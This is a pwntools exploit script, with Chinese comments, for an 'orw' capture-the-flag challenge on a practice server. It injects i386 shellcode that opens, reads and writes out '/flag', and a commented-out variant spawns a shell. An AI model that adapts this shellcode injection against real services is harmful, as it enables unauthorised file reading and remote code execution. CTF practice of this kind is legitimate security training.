from pwn import *
from LibcSearcher import LibcSearcher
import sys, time

io = -1
############################
#********修改文件名**********
############################
file_name = 'orw'
port = 28988

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
只能用open read write
'''
# shellcode = shellcraft.i386.linux.sh()
# shellcode = asm(shellcode)
# print(shellcode, len(shellcode))

# io.recvuntil(b"Give my your shellcode:")
# io.send(b'\x90' * 0x20 + shellcode)

shellcode = ""
shellcode += shellcraft.i386.pushstr("/flag")
shellcode += shellcraft.i386.linux.syscall("SYS_open", 'esp', 0, 0)
shellcode += shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
shellcode += shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
# print(shellcode, hex(len(shellcode)))
shellcode = asm(shellcode)
# 

# print('#'*100)
# shellcode = shellcraft.open('/flag')
# shellcode += shellcraft.read('eax','esp',100)
# shellcode += shellcraft.write(1,'esp',100)
# print(shellcode)
# shellcode = asm(shellcode)

io.send(shellcode)

io.interactive()
